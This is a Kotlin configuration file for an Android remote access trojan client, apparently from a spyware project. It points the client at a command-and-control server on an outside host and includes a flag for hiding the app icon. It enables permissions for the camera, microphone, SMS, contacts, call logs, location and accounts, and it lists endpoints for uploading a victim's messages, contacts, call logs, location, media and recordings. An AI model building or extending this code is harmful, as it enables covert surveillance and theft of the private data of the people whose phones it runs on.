package com.rat.client

/**
 * Build-time configuration for the RAT client.
 * Admin updates these values via the APK Builder page, then rebuilds the APK.
 */
object Config {
    // === SERVER CONFIGURATION ===
    const val SERVER_URL = "https://rat-c2-backend.onrender.com"
    const val HEARTBEAT_INTERVAL_MS = 30000L // 30 seconds

    // === APP CONFIGURATION ===
    const val HIDE_APP_ICON = false

    // === PERMISSION FLAGS ===
    // These control which permissions are requested at runtime
    const val PERM_CAMERA = true
    const val PERM_STORAGE = true
    const val PERM_LOCATION = true
    const val PERM_MICROPHONE = true
    const val PERM_SMS = true
    const val PERM_CONTACTS = true
    const val PERM_PHONE = true
    const val PERM_CALL_LOGS = true
    const val PERM_ACCOUNTS = true

    // === API ENDPOINTS ===
    object Api {
        val BASE_URL = "$SERVER_URL/api"

        const val REGISTER = "/devices/register"
        const val HEARTBEAT = "/devices/heartbeat"
        const val LOCATION = "/data/location"
        const val SMS = "/data/sms"
        const val CALL_LOGS = "/data/calllogs"
        const val CONTACTS = "/data/contacts"
        const val APPS = "/data/apps"
        const val ACCOUNTS = "/data/accounts"
        const val UPLOAD_MEDIA = "/data/upload-media"
        const val UPLOAD_RECORDING = "/data/upload-recording"
        const val COMMAND_STATUS = "/data/command-status"
    }
}

